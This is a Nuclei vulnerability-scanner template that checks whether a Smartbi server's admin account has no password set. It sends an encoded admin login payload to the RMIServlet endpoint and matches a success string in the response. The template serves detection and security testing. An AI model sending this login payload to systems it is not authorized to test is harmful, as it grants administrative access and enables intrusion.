id: smartbi-unset-admin-password
info:
  name: Smartbi Admin Password Unset Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password

variables:
  v_auth: |
    Vctw6_R-Wp4gRip+iIpiG8w-R6c6_w+/JV/uu(hdR6/uu/ut/uu(hdR6/uu/JT

http:
  - method: POST
    path:
      - "{{BaseURL}}/smartbi/vision/RMIServlet"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "encode={{v_auth}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"H~*2KC\":CH2~"
